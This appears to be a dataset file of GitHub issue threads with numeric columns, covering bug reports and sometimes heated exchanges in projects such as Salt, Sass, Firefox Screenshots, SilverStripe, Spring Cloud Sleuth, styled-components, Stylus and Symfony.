running the command as sudo but I have not been able to reliably reproduce this behavior. I have also tried (and failed) to use the documented instructions to install the second-most-recent version, but it might be better to stop here and keep the focus on the current problem. Any suggestions?  We ended up switching from Raspbian to Arch.  We got it working with a Pi 2 on Raspbian, but in order to support both platforms we had to move to Arch. On Sep 8, 2015 1221 AM, ""neilr8133"" notifications@friend.com wrote  Any news on this ? )  @friend, not that I know of.  We're working on getting through our backlog of issues.  I just hit this, I had been bootstrapping pi's just fine, albeit with an older version of salt-bootstrap (2015.08.06 + mods). It seems to only be broken on the raspbian lite image for me. I've been using the offical Raspbian jessie images 2015-09-24-raspbian-jessie (works) 2015-11-21-raspbian-jessie-lite (fails) So its probably a dependency issue or a botched build of some package in the lite image. Running   gives the following output which may point to openssl, of course I might be on the wrong track....  When following the latest install instructions here  will fail to run on a raspberry pi (Illegal Instruction). But after running another apt-get upgrade which unpacks python-tornado 4.2.1-1+b2 (from stretch) over 4.2.0-1~bpo8plus one (from jessie-backports) it magically works. I think the issues are from using the standard debian repo for binary packages instead of raspbian. The python-tornado package from the standard debian archive doesn't seem to want to run on armv6 which makes sense. I'll test a fresh install without using jessie-backports and if that works i'd suggest we update the documentation for install on raspbian.  @friend For now, Salt Bootstrap doesn't support automatic installation on Raspbian. Try to follow installation instruction that @friend has suggested. I guess this issue could closed as a duplicate of saltstack/salt-bootstrap#695. Thanks!  With the Raspberry 2b, we switch to official Debian image which fully support ARMv7.  So for us, it's ok )  The Raspberry Pi 1 and 2 range are an old ARM 32 bit chip 99% of distros have dropped support for this old ARM chip.  Most (if not all) of the other single board chips run the current ARM 32bit chip   So for Raspberry Pi 1 and 2 you must get any binaries for the Raspberry Repo and not any other source.   Raspberry Pi 3 just release is current 64bit chip which will see the Raspberry Pi being able to run more distros.  I run fedora on a WandBoard which uses current 32bit chip and point the repo at the x86   and run dnf install salt* it picks up the noarch from salt the the binaries come from fedora.  I think it's a real shame that salt-bootstrap does not support raspbian and all raspberry pi's out of the box. At our salt meetup (Paris), we often have people complaining about this. Note that often people want to try out at home this technology before recommending it to their boss or at work, so in my humble opinion, theses users should get the best UX possible, and for all versions of the Pi. Seeing that a project considers Pi1 or 2 as ""old"" platforms is usually perceived as ""oh, so it's meant to run on some cutting edge hardware"". I would like to keep on encouraging hobbyists to try out salt for things such as home automation like suggested in  ... it's getting harder and harder.  @friend I think you're very welcome to submit PR to  for now, you're able to install Salt manually from Raspbian testing repo  simple script (few lines of Bash) could be written following this guide to perform bootstrapping exclusively for Raspbery PI.  I got Puppet running on ARM, logged a case for better support and got back not supported at all, and no plans to support.  SaltStack have a good attitude towards ARM Platform.  TLDR Use -P Ran into the same problem, tried the approach ""few lines of bash"" but there is also a even simpler workaround. First the bash approach (The keyserver lines are necessary at least in the current Raspbian 2016-11-25-raspbian-jessie) But as seen in  , the current default-development-branch's commit, it is already enough to specify the -P option        -P  Allow pip based installations. as then the required version will be satisfied. So this is then the currently working bash script to install salt master and minion on a Raspberry Tested on Raspbian version 2016-11-25-rasbian-jessie.  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. Thank you for your contributions. If this issue is closed prematurely, please leave a comment and we will gladly reopen the issue. ",25,312,270,0,0,206,11,
saltstack/salt/3618,0.0976734,saltstack,salt,Assertion failed: ok (mailbox.cpp:84),8175,109,270,0,7,"When I try to make use of the reactor, I end up with an Assertion failed message. After that message, no minions can authenticate to the master and trying to stop the master process through the init script fails. I do see the master process running and need to use killall to stop it. If I then remove the reactor piece of the master config and start the master process, everything starts working again. root@friend~# /etc/init.d/salt-master start Starting salt-master daemon Assertion failed ok (mailbox.cpp84) . root@friend~# /etc/init.d/salt-master stop Stopping salt master control daemon ...start-stop-daemon warning failed to kill 10113 No such process . root@friend~# killall salt-master root@friend~# cat /etc/salt/master timeout 30 log_level warning state_verbose False  file_roots   base     - /srv/salt     - /srv/data  pillar_roots   base     - /srv/pillar  ext_pillar   - boothost_templates {}  reactor   - 'auth'     - /srv/reactor/empty.sls  root@friend~# cat /srv/reactor/empty.sls  return_true   cmd.run     - name echo 'hi'   I take it you are using git head? Do you have zombies when this happens?  Yes, I'm using head. I don't know how to tell if I have zombies or not... I'm going to guess that I do because that would explain the attitude the processes give me. When it's pissed, ps aux shows me this. It's set to have the default number of processes. root     10364  1.3  2.0 136600 21412 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10371  0.0  1.5 170972 16076 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10374  0.0  1.5 170300 15564 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10379  0.0  1.5 186692 15808 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d When it's working fine... root     10418  0.0  1.6 235960 16444 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10419  0.0  2.0 136600 21408 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10426  0.0  1.5 170960 16068 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10427  0.0  1.5 170824 15852 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10428  0.1  2.2 222300 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10435  0.1  2.2 287840 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10436  0.1  2.2 287840 22764 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10437  0.1  2.2 287840 22772 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10438  0.1  2.2 287848 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d  ok, this is not zombies, those are all S and Sl flags for healthy processes, it looks like the procs are failing to start!  They don't love me... ( Is there something I probably did wrong or is this a bug? If it's a bug, please let me know what I can do to help fix it.  meh, I can't reproduce this. How old is your git head?  It's from yesterday. I'll try it on the latest now.  .. same thing  What version of Zeromq are you running?  This is Debian right?  Yup. root@friend~# apt-cache policy python-zmq python-zmq   Installed 2.2.0-1   Candidate 2.2.0-1   Version table  *** 2.2.0-1 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status   What version of libzmq are you running? is it libzmq 2.2.0 or 3.2? I think this might be us running into a know libzmq 2 bug (which would explain me having issues reproducing this)  The package name is libzmq1  So this Assertion happens because of a bug in libzmq 2, and if a zmq context it passed through to a new thread or process, I have verified that the later is not happening in the code anywhere. So I am wondering what apt-cache policy libzmq1 says, and if updating to libzmq3 will fix it  #  apt-cache policy libzmq1 libzmq1   Installed 2.2.0+dfsg-2   Candidate 2.2.0+dfsg-2   Version table  *** 2.2.0+dfsg-2 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  I also installed libzmq3 from experimental. I ran into the same problem. The salt-master depends on python-zmq which depends on libzmq1. So I have both libzmq1 and libzmq3 installed right now. I'm not sure how to make sure I'm using libzmq3(3.2) instead of libzmq1(2.2). I could install salt from source on the system, but I very much prefer build the package on our apt mirror and install it from there... #  apt-cache policy libzmq3 libzmq3   Installed 3.2.2+dfsg-1   Candidate 3.2.2+dfsg-1   Version table  *** 3.2.2+dfsg-1 0           1  experimental/main amd64 Packages         100 /var/lib/dpkg/status   If I change the dependency in the package to libzmq3 instead of python-zmq and install libzmq3 without either python-zmq or libzmq1 (its dependency) then I get ""ImportError No module named zmq"". I guess I don't really have any idea how to get zmq3 without zmq1. (  Sorry, I should have been more specific, libzmq3 is just the latest zeromq, it is much better and we leverage it for a lot of new features. you still need pyzmq installed, since that is the python bindings to libzmq, although you may need to recompile pyzmq after libzmq3 is installed  I think there are packages out there, lemme look   doesn't even have 3.2. I installed libzmq3 and then rebuilt pyzmq with ""easy_install -U pyzmq"" and now when I start the salt master, I get this - Starting salt-master daemon Assertion failed ok (bundled/zeromq/src/mailbox.cpp84) I'll wait until I give you a chance to do smart people research. )  yes, pyzmq 2.2.0 works against zeromq 3.2, it is kind of confusing, but we are still getting the assertion!!! Lemme keep trying to find out what is happening  man, if I could get on your system and start throwing in debug output this would be a lot easier to find.... I am still looking )  I am stumped, I can't reproduce it, I can't find any legitimate place in the code that would cause this, libzmq3 does not seem to fix it. I am still thinking and researching, but I am drying up on ideas....  If you were to chat with me on IRC I could do everything you ask as you ask me to do it. I unfortunately wouldn't be able to let you into the system.  Interesting... If I leave out the reactor part, I wind up with ""salt-master -l trace"" doing exactly what I expect. If I add the reactor part of the config and run ""salt-master -l trace"" and what I see is this,  not pressing Ctrl+C to kill it. It seems to just stop running but salt-master processes continue to run in the background.  This is the part that I find interesting from that... [TRACE   ] Added extra.config to grain [DEBUG   ] SaltEvent PULL socket URI ipc///var/run/salt/master/master_event_pull.ipc [INFO    ] Setting up the master communication server [TRACE   ] Added extra.shell to grain Assertion failed ok (mailbox.cpp84) Aborted root@friend~# [DEBUG   ] loading module in ['/var/cache/salt/master/extmods/modules', '/usr/lib/pymodules/python2.7/salt/modules'] [DEBUG   ] Skipping /var/cache/salt/master/extmods/modules, it is not a directory [DEBUG   ] Loaded groupadd as virtual group [TRACE   ] Added group.add to module  It shows the prompt but keeps truckin' along. [DEBUG   ] Loaded sysmod as virtual sys [TRACE   ] Added sys.doc to runner  root@friend~# ps aux | grep salt root     16563  0.0  2.1 136884 21620 pts/1    S    1419   000 python /usr/bin/salt-master -l trace root     16570  0.0  1.5 175036 16140 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16571  0.0  1.5 174500 15660 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16578  0.0  1.5 191024 15896 pts/1    S    1419   000 python /usr/bin/salt-master -l trace   So far, I've managed to get to line 130 ""self._popen = Popen(self)"" of process.py before I see the error. I have no idea what I'm doing here, I'm just able to see it getting that far and that being the line where things go boom.  This does make it look like a zmq context is being passed into a new process, I am going to hop into IRC ",19,0,578,0,0,215,25,
saltstack/salt/49765,0.05440006,saltstack,salt,Snotty people on #salt IRC channel,3328,52,28,0,0,"Description of Issue/Question Don't understand the attitudes of the people on IRC Setup I am deploying windows machines. The deployment system auto installs salt with the correct salt ID's (that's pretty neat but I won't go into details). The salt ID's are partially based on a date stamp and remain permanent for the life of the PC. They are effectively the true names of the PC's. The deployed machines are not set up to automatically domain join. Partly because the Windows computer names names are somewhat in flux. Partly because my boss and co-workers don't want our credentials stored anywhere To domain join I create an sls file which can be invoke by the sysamin. The runner will ask for a user name and password and pass that as pillar data. The intended computer names come out of an external pillar (stored in a postgresql db). The runner then just applies the state and the PC's join with their intended names. I've been testing this today and it's working well, but people on the #salt irc channel were giving me flak and insinuating that I'm an idiot. BTW i don't care if i am an idiot. I just want to know why anything I'm doing is worse than anything anyone else does. I have asked #windows people ""how do you join 100 machines?"". This is the conversation So there you have it, the typical process involves someone ineracting with 100 machines. I avoid all that. Why am I being criticised?  Hi @friend. I lead the core maintainers team at Salt. I'm sorry you felt criticized. In the morning, I'll ask somebody on @friend/team-windows to try to help you with your question specifically. I do want to respond, however, to your comment about the ""vision of management"" of Salt to ""extend in every direction"". As the principal maintainer of this project, my view is one of great pride that people in our community are trying to offer what they may see as the best solution for a problem, regardless of whether or not that answer involves Salt. While I hope that we can always continue to grow the project to cover more ground, If another solution for a given problem is better than ours, I hope our community continues to have the integrity to heartily recommend it over Salt in the interest of being as helpful as possible instead of merely dogmatic. That said, I hope you'll keep using Salt and, as I said, I'll make sure the Windows folks get in touch with you in the morning to see if there's a way that Salt can be made to work in a way that solves the problem you're concerned with. Best, -Mike  @friend I don't need any help specifically. All of the specific technical problems I was having are resolved. My first question was ""how could this be done better without salt"", since people were implying that it could. I couldn't think of any solution that would be substantially simpler in terms of number of operations. I'll forget about the scond point I was making for the time being.  I assume above is the main point of this issue. There is a slack channel for windows help. Slack keeps a few days worth of history, so if people are not constructive in their comments  its more noticeable. (Invite sent to you email address)  I'm sorry about this. Anyway I've come up with a much better system thanks to some of the help I got on slack. Thanks to all the people who have helped me with suggestions so far. ",14,1,100,0,0,85,2,
sass/sass/2507,0.23283252000000002,sass,sass,Regarding issue #132,661,5,6,0,0,"Regarding issue #132 Every language has string interpolation. Add the feature, stop being stubborn. Also in my opinion those who work for 30 years plus get stuck in their own (old) ways and don't like change. @friend . By expressing string interpolation is a bad idea, is just saying all other languages who have implemented it are wrong to do so. Also, closing/disabling comments is a bad form of censorship which goes agains Open-Source ideals. Please reconsider! and change old habits, they are toxic.  Name-calling is not acceptable behavior, nor is attempting to re-open a locked issue. Don't do it again or you will be blocked from the Sass organization. ",1,0,25,1,0,12,1,
mozilla-services/screenshots/4211,0.15709077999999999,mozilla-services,screenshots,Datestamp in titles results in duplicate titles if taken on the same day,4714,59,32,0.8,0,"From discourse  This was reported as producing the same name, but testing shows the filenames have a number in them, eg  file.png -&gt; file(1).png -&gt; file(2).png, etc.  I think it's put there by the browser?  So...we're going to close this.  I'm on the latest Firefox 59.0.2, GNOME 3, and I'm experiencing the duplicate filenames issue. Steps to reproduce  Visit a website (e.g. this page on github). Take a screenshot of the visible part of the page. The save dialog appears with the Downloads directory open in it. Change the directory e.g. to Pictures. Save the screenshot. Take another screenshot of the visible part of the same page. The save dialog appears, and it shows the Downloads directory again. As there is no file with this name in this directory, ""(1)"" is not appended. Change directory to Pictures. Try to save the screenshot, and the save dialog warns you that you are trying to overwrite the existing file.  Expected result No filename collision between the screenshots taken at different times. Actual result Screenshots taken at different times have the same filename, and the user is forced to manually rename the file. Additional comments ""(1)"", ""(2)"", etc. are really appended to the filename if you don't change the directory in the save dialog and just save everything to Downloads. But if you want to store the screenshots to a different directory, you are forced to select it manually each time which is annoying, and no ""(1)"", ""(2)"", etc. are appended in this case. The best solution in my opinion is to just include a timestamp (including seconds) in the filename.  @friend Thanks for the feedback. This bug has been closed as a wontfix, sorry. FWIW, on linux, you should be able to use something like  to auto-detect filesystem changes, and automatically rename any files matching the Screenshots initial part to include a local timestamp. I realize this isn't the answer you're after, but at least you can easily hack together a DIY solution plus one  ORLY? I can't see any mention of this resolution ITT. What I see is the following which means that the bug is closed as invalid/not reproduced. I suggest the steps to reproduce the bug so that you all could see that it's valid. So why not just follow the steps, reproduce the bug and reopen it, then fix it? It's trivial to fix that little tiny thing that irritates and annoys a lot of users, but instead you suggest some ugly workarounds when it's Firefox Screenshots' job to name the files correctly. Instead of creating the file with the correct name, you suggest creating a file with a wrong name, running a daemon that runs inotify watches and renames them. And I strongly believe that you understand the consequences of that ""solution"" — it's easy enough to get into an inconsistent state, be it a power loss before renaming, or a daemon crash, etc. There is a kind of people who write low-quality bash scripts for everything with hardcoded , race conditions, improper escaping, etc. I'm not one of those people, and I'm not gonna turn my computer into a dump by writing buggy scripts when someone refuses to fix their buggy software. It's too sad to admit that the new Firefox has taken a self-destructive course. Firefox Screenshots demonstrate that perfectly. First half of the extensions is broken including the extension I used to take screenshots. Then Mozilla introduces a built-in screenshotting tool which is, by the way, inferior to the one I used before. And what we see here? A big blue Save button that sends my private data to the cloud instead of saving my screenshots (#3603). Ugly error messages when just following a normal user flow (#3964). Too many clicks to just save a screenshot — it takes me at least 5 clicks just to save a shot of a page when it had taken me only a single click when I used a third-party screenshotter extension. One screenshot a day limit (#4229, #4211). No way to customize the filename pattern (#4229). Doesn't remember the directory where I store all my screenshots (#4211). These all make this piece of software absolutely unusable. These are the real problems, because they break UX. However, from version to version, nothing changes in Firefox Screenshots, still the same problems, still unusable. And the developers just say they are not going to fix that. Firefox Screenshots' fate is sealed. Just like Firefox Hello, it started as a new good useful tool, but it will end up exactly the same way, because it doesn't seem to be developed any more. I beg my pardon for possibly rude voice, but I'm seriously concerned about my favorite browser's future, and such responses from the developers are no good sign.  Let's take a minute to chill. Locking this issue for now. ",5,5,192,0,0,103,4,
getsentry/sentry-elixir/282,0.11597502000000001,getsentry,sentry-elixir,Document full dependencies ,1611,16,5,0.6666666666666666,2,"By specifying the below you are saying that for all combinations of software on which Elixir runs, your software runs. However, we already know that this isn't the case, because of existing (unresolved) bug reports related to parallel compilation; bugs your team has not addressed in an efficient or effective manner, I should add. So, before I will actually try to debug anything, I would like to hear from you -- the vendor -- what the dependencies actually are to make this work on generic Linux. Preferably I would like to see this fully automated in a script of some kind named . This script would check for the operating system, libraries on which it depends (which you have done partially, I believe already), OTP versions, etc. The script should output either an exit status of 0 signifying that a subsequent compile is guaranteed to work or an exit status of 1 when the system configuration is not OK with a list of errors of what's wrong.  In the future please link to the issues and errors that you are having. I understand you are having trouble and this is a very annoying bug. You must understand how hard it is to fix an issue when its not easy to reproduce your self. The issue as presented is not a productive way to interact with any human being. It turns out that this is a bug in the Elixir Compiler and is being fixed for elixir 1.7.  issue is with how deps are being reported to sentry, the only fix at the moment would remove dep's from being reported at all until mix is fixed. We're discussing possible options and should have a fix out soonish.  This should temporarily fix the issue. ",10,0,39,0.3333333333333333,0,27,0,
silverstripe/silverstripe-framework/7761,0.077779521,silverstripe,silverstripe-framework,Unorthogonal interface TextField Vs. HiddenField,3931,38,45,1,3,"SS4.0 TextFieldcreate(&lt;name&gt;, &lt;value&gt;) OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;) NOT OK. HiddenFieldcreate(&lt;name&gt;)-&gt;setValue(&lt;value&gt;) There is not reason to trip up new developers like this  @friend Can you provide more info on what specifically you expect to happen vs what’s actually happening? The second argument should be the title (that is, the “label” used when the field is displayed) - the third argument is for value - is that what’s causing your issue? It is a little strange to push a title to a  when that title will never be displayed, but it keeps that API (slightly) more consistent with other form field types )  Your examples are wrong.  objects are ♠FormFieldcreate(&lt;name&gt;, &lt;label&gt;, &lt;value&gt;)` see  No.  FormField from  that pattern for a hiddeen field does not work in the template as Results in  @friend that all looks as expected... if you add and you'll get output  The bug is that the interface for a text field and a hidden field are different.  IMO They should be the same.  can you explain in what way they are different, please?  TextFieldcreate(&lt;name&gt;, &lt;value&gt;); // OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;); // NOT OK.  @friend - I'm sorry, you're not being clear. both of those work, don't result in error, output expected HTML/fields. Form what I can tell you actually are asking for these APIs to be different, not the same... You'd like 's second constructor argument to be the value and not the label, is that right?  They produce different output. See above where I created an example and cut and pasted resulting HTML.  That is expected, the two examples you're giving are fundamentally different In the above code,  has no value set and just a name and label,  has a name and no label and a value is set. Therefore you'd expect different output and the output you've shown looks expected.  has no value and  does.  No. produces produces Those are different.  The second argument to the FormField is the value not a label according to the API documentation.  As I read it  Worik, sorry mate... I think you're confusing Title (ie. html ) and Value (ie. html attribute ). This is true for virtually every form field. Perhaps if you can provide a link to the documentation you're reading specifically, and what it is that has you turned around from it? ie. suggestions on how it could be clearer? Maybe the wording is a bit confusing.  I am showing you code I have been implementing. On close examinatuion the second argument for TextField constructor chould be 'Title' BUT, having missed that, I passed a value as the second argument to create(..) and hey presto it is the value.  Doing exactly the same pattern for HiddenField resulte in a different output. That is a bug.  I have reproduced it Ad nauseam Perhaps the TextFiled interface is buggy, I do not know,. it is the way it is used in the lessons, perhaps they are buggy too.  I do not know. But I do know this The interfaces to the HiddenField and TextField's create method are different when they should be the same. I have made that clear in examples above.  It is bnot a hypothesis but an observation. It may not seem like a bug to have idiosyncratic interfaces, but it makes life very difficult for new comers to the platform  Test 1 Creates Test 2 Creates  @friend Is this SilverStripe 4.0? Lets step through it together ) public function __construct($name, $title = null, $value = '', $maxLength = null, $form = null)FormFieldHiddenField`. You can see this here  Whatever.  That is all nice theory.  But the facts, here are that the interfaces differ.  SS4.0  I'm going to lock this topic, since it looks as if the original question has been answered adequately and the discussion seems to be degrading. Please keep in mind the SilverStripe code of conduct when contributing and responding to bug reports. Thanks =)  @friend how about we catch up  on slack ) ",13,0,221,0,0,139,7,
spring-cloud/spring-cloud-sleuth/991,0.15927630250000002,spring-cloud,spring-cloud-sleuth,"trace mysql use ""brave-instrumentation-mysql"" is not using ",3300,13,147,0.3333333333333333,3,"&lt;dependencyManagement&gt;         &lt;dependencies&gt;             &lt;dependency&gt;                 &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                 &lt;artifactId&gt;spring-cloud-sleuth&lt;/artifactId&gt;                 &lt;version&gt;2.0.0.RC1&lt;/version&gt;                 &lt;type&gt;pom&lt;/type&gt;                 &lt;scope&gt;import&lt;/scope&gt;             &lt;/dependency&gt;         &lt;/dependencies&gt;     &lt;/dependencyManagement&gt;     &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-starter-sleuth&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-sleuth-zipkin&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-instrumentation-mysql&lt;/artifactId&gt;             &lt;version&gt;4.13.1&lt;/version&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;mysql&lt;/groupId&gt;             &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-mysql&lt;/artifactId&gt;             &lt;version&gt;4.0.6&lt;/version&gt;         &lt;/dependency&gt; &lt;/dependencies&gt;   if you want us to help you have to stop re-opening issues and use gitter instead ok?   issues can cause some annoyance. you were asked to not open an issue and did it again. Moreover you opened an issue after already creating this one.. please don't behave like this as we want to help but it is hard when annoyed ok?  This problem has not been dealt with completely, you close, this behavior is too responsible, the first use of this, can not be more patient?  I'm trying to make my point. How do you feel so impatient  Your attitude of forcing closure without solving the problem is really disappointing  We've asked you to use gitter. that's how we support things. This needs to be investigated as a problem before using an issue. As mentioned in the issue template, issues are used for changes to the codebase. I don't think a change will occur here in this repository. Please don't make us block you.  I also asked you multiple times to provide your full codebase and instructions on how to replicate the issue. Also, I've asked you if you followed the guidelines in the brave-mysql instrumentation repo. You have provided no feedback and kept ignoring my questions.  I didn't even come and provide the full code, so you shut down the problem  you posted the issue twice.. here after posting here less than a day ago  are you not joining gitter like asked? do you feel that doing the opposite will make things better for either you or us, or the hundred people who are alerted when you post issues like this? The request on the issue is to please try the example, and if report back on gitter what happens. please do that and stop pasting things at us. it is easier and we can be friends as opposed to being frustrated ok? ",5,0,307,0.3333333333333333,0.3333333333333333,44,6,
styled-components/styled-components/1721,0.2271971075,styled-components,styled-components,How to use themeprovider without wrapping entire app?,2701,34,22,0.6666666666666666,0,"@friend I am really don't know who is best person to address this question, I found greelen name first in the list so addressing you. I am creating component library for client which I am using as npm link to use it in create react app. But the question is component library project has no App container so I can not wrap it as  ♠&lt;ThemeProvider&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;` So what is the alternate way I can use themeprovider? How can I use as importing to each component and use theme props? Please help.  What component library tool are you using to develop? (storybook, styleguidist) They usually offer a way to have wrapper components. Let me know, and I can help you out.  Do I really need need storybook or styleguidist? Without container shouldn't I use theme provider? For now I have ex. colors.js where all colors are defined and I am importing that colors in every component. Is there any advantage using theme provider instead of this approach? And if yes then let me know how can I leverage theme provider without introducing any other third party library?  You don't technically need to use  to use styled-components.  I think you don't understand what I meant. I said I want to apply theme to my styled component. Ex. Here is the code my styledLabel component import styled from 'styled-components'; import  as fonts from '../styles/fonts'; import  as colors from '../styles/colors'; ; module.exports = {   sidebar '#1D242D',   primary1 '#696D73',   primary2 '#535354',   primary3 '#929497',   canvas '#FFFFFF',   highlight '#4F80FF',   accent1 '#DBDCDF',   accent2 '#CCCCCC',   alarm '#EE4623',   background '#EDEEF1' }; ♠ Here if you can notice I have given color from color.js. @friend @friend is the same as wrapping component in ?  @friend I don't think I understand your use case, unfortunately. That being said, if you aren't able to reliably wrap your entire app with a , you can alternatively wrap your individual components with it in the implementation. ; export default function ThemedButton(props) {   return (     &lt;ThemeProvider theme={theme}&gt;       &lt;Button {...props} /&gt;     &lt;/ThemeProvider&gt;   ); } ♠ For example.  @friend can you please read entire thread first because your answers are irrelevant? @friend  If no body can answer from styled components team then please close this issue, because I am not getting proper answer.  I did read it and I said in my response I don’t understand your use case but am trying to help anyway.  In case you didn’t know, we are all volunteers working on this project. Your attitude and sense of entitlement for a perfect solution to your mostly unelucidated use case is both rude and condescending. ",10,0,161,0,0.3333333333333333,90,9,
styled-components/styled-components/2426,0.15005921,styled-components,styled-components,Cannot edit whatever .oxevfn is,988,11,6,0,0,"Can we hold Google chrome responsible for .iwuvb not being editable in a browser. I think the deliberate obfuscation built by Styled-Components in 100% negligent and generally affects my workflow negatively slowing it down 600%, but the fact that I cannot even manipulate the thing without rewriting it is complete BS. I cannot wait for this terrible of CSS-in-JS shim to be native and integrated with browser dev tools. In the meantime UI will move an a snails pace until Javascript Engineers and Browsers Engineers can all agree there is a visual element to UI and being able to see what I'm doing becomes again an element to the workflow of UI development. Being able to understand where .iubcx came from without the hacky babel plugin that's not even that helpful will be a step in the right direction. Why is using unique class names not used for building unique components who already have unique names? It's beyond me -- it seems like a personal attack on UI Engineers everywhere. ",6,0,20,1,0,32,1,
openstyles/stylus/498,0.206852019,openstyles,stylus,When Stylus is disabled it continues to inject a style element,1952,18,18,0.6666666666666666,0," Browser Firefox 62 Operating System Windows 10  Noticed as a result of #461 and #497 - even when Stylus is disabled with the ""Turn all styles off"" option, it continues to inject a  element. It only stops injecting the style element when the configured styles that are applicable to the current page, are all individually disabled.  This is how Stylus (and its ancestor Stylish-for-Chrome) always worked so it's not related to the mentioned issues. I guess the reason is that the purpose of ""turn all styles off"" option is to toggle all styles quickly in case of problems or when writing styles.  Didn't say it was. Only said it was how I happened to notice it. I'd say the fact that Stylus currently breaks sites that try to read  in Firefox, as per above issues, is a pretty big problem. In the more broader sense if I tell an extension to temporarily ""hands off!"" and disable itself for a page; I expect it to ACTUALLY leave the page alone. Which Stylus doesn't do with the big panic button, that is specifically meant for these use-cases. It instead requires disabling each individual applied style... The fact that this is how Stylus 'alway worked' doesn't mean it is correct.  You can simply disable the extension itself.  Doesn't change the fact that Stylus's behavior is non-orthogonal and stupid. It keeps the style element around (but empties it) when you check the ""turn all styles off"" option. But it removes the element if you remove all checkmarks from all individual styles that were active. Fine if you don't want to fix it, just don't make up bull excuses for the differing behavior, like performance impact. The actual cost of CSS updates is in parsing the CSS text; updating internal stylesheet data structures; re-matching selectors to the website HTML; re-applying layout; re-applying painting; and finally re-applying compositing. Recreating the style element is negligible to the extreme.  There's no need to change the behavior ",2,4,69,0.16666666666666666,0.16666666666666666,55,1,
symfony/symfony/17749,0.052129227,symfony,symfony,[RFC] Move tests out of the source and source out of the tests,12251,117,78,0,8,"The Source  Often when I'm auto-completing classes in my IDE, I get the suggestion to use the *Test file. Project wide searches and Usage Finder always shows tests using the search key or method/class etc. KernelTestCase and WebTestCase are library dependencies in a test directory  I'm working on adding some functional tests to a bundle and this gave me a problem. I had to depend on the FrameworkBundle 2.3 for BC reasons but I couldn't depend on 2.3 because that one didn't have the KernelTestCase yet so I needed 2.5. The Symptoms For applications the recommended location is in /tests/. For Application bundles this seem to be /Tests/ and the same goes for re-usable bundles. The current setup with the recommendations and implementations cause a few issues  I need to load files from the vendor Tests in order to run my tests. I get vendor test files which I can autoload and depend on. 2 different recommendations for test locations. I cannot easily exclude them from the distributed version.  The Solution Personally I always put my code in bundles in the /src/ directory, this gives me a clean root directory and my tests in /test/. This leaves the root directory for all the meta-information for your package (example). So my suggestion is  Extract the  and  to another component (PhpunitBridge?) where they can reside in the source instead of test location. Exclude the tests from the archive. Not put the source in the package root but in /src/ like suggested for applications. Put tests in /test/ or /tests/ where they have an autoload-dev so they cannot be loaded in production code.  This will create a clearer structure where your source is not polluted by the tests and you cannot put anything of your public api in your tests (like the TestCases). When the test-cases are moved out, I can also require 2.3 or higher instead of 2.5 and higher (thus 2.7).  This topic has been discussed some time ago, the major problem with this idea is the subtree split of each component.  @friend Yeah I got informed about that. I've updated the issue.  We used to have tests outside of the src directory (see  usually put test cases outside of the tests namespace already, so they're not part of the  namespace. Both WebTestCase and KernelTestCase are already in the  namespace (the first one was moved recently).  To me there is a difference between tests  (internal, should not be extended in other packages) and test helpers  (traits/test-cases). When you ""need"" (there is no other way) to extend a test helper that is in  it should be moved to  so you can use it. I actually have that problem with some Doctrine tests,   I solved using  there is a risk of breakage here as I'm using classes that are not part of the public API and therefor have no BC policy. Mark tests directories as excluded plus one going to that now as I to have fallen trap to this...  @friend, that's 68 (symfony 49) directories in total which I'd rather not even have on my filesystem to begin with. I only need them when I explicitly install that repository and I have to run them. Given I'd exclude Tests via a regex, the kernel/web tests are excluded too. The solution is valid but won't work if you have 20 applications and dozens of bundles which all use symfony.  This was also done with gitattributes and reverted in #6605 I still think this should be reintroduced as I said in   Tests are documentation and should remain next to their src. For production releases, I assume everyone has their own prefered deploy mechanisms removing files not needed for such an env can easily be accomplished during your preferred deploy operation. I too use PHPStorm I don't understand the difficulty of setting the tests directory to ignored within the IDE if such is desired.   @friend Because if you use symfony/symfony and have 20+ applications doing this, you'll spend too much time ignoring them, where as excluding tests from the packaged version is something you do with your own package, not that of others.  An other option  I also just sent this message to github support Is there a way to get a ZIP that includes ALL files (i.e. that is built without taking .gitattributes into account?) That would be really great because that would allow us to have packages for our project one for humans (with the full source) and one for robots/ci-scripts (the current one). If anyone has the answer (or could push for making this happen), help welcomed )  An other option would be to add a feature to composer to clean paths specified in the  option in composer.json files.  One more reasons to exclude tests Composer beta  Here is my reasoning pro keeping tests where they are and also in the .zip archives  Some of us want the tests out, either because e.g ""they pollute their autocompleter, or their code searches or just their filesystem"". Some of us want the tests in, because e.g. ""having them always at hand enables this coding 